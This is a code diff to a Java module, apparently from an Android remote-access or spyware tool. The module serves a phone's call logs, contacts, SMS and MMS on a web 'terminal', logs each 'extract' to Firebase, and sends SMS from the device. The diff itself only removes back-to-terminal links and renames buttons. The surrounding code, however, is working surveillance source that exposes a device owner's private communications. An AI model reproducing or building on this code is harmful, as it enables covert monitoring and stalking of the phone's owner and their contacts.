@@ -84,9 +84,6 @@ public class CommsModule extends BaseModule {
     private Response serveCallLogs(Map<String, String> params, IHTTPSession session) {
         FirebaseConfig.logActivity("COMMS_EXTRACT: Call history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">RECENT_CALL_LOGS</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
@@ -274,9 +271,6 @@ public class CommsModule extends BaseModule {
     private Response serveContacts(Map<String, String> params, IHTTPSession session) {
         FirebaseConfig.logActivity("CONTACT_EXTRACT: Address book retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">CONTACT_DATABASE</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
@@ -423,9 +417,6 @@ public class CommsModule extends BaseModule {
     private Response serveSmsMessages(Map<String, String> params, IHTTPSession session) {
         FirebaseConfig.logActivity("COMMS_EXTRACT: SMS history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128233; SMS_TERMINAL</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
@@ -521,9 +512,6 @@ public class CommsModule extends BaseModule {
     private Response serveMmsMessages(Map<String, String> params, IHTTPSession session) {
         FirebaseConfig.logActivity("COMMS_EXTRACT: MMS media database retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
-        html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
-        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128247; MMS_TERMINAL</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
@@ -833,7 +821,7 @@ public class CommsModule extends BaseModule {
                     smsManager, number, null, message, null, null);
             }
 
-            String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
+            String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\">Back to SMS</a></div></div></div>" + getFooter();
             return server.serveGzippedProxy(session, "text/html", html);
         } catch (Exception e) { return server.serveErrorProxy("Failed to send SMS: " + e.getMessage()); }
     }
@@ -871,7 +859,7 @@ public class CommsModule extends BaseModule {
             } else {
                 html += "<div class=\"icon\" style=\"color: var(--danger);\">&#10006;</div><h2>MMS Failed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Could not dispatch media package. Check device logs.</p>";
             }
-            html += "<div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
+            html += "<div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/mms\" class=\"btn\">Back to MMS</a></div></div></div>" + getFooter();
             return server.serveGzippedProxy(session, "text/html", html);
 
         } catch (Exception e) {
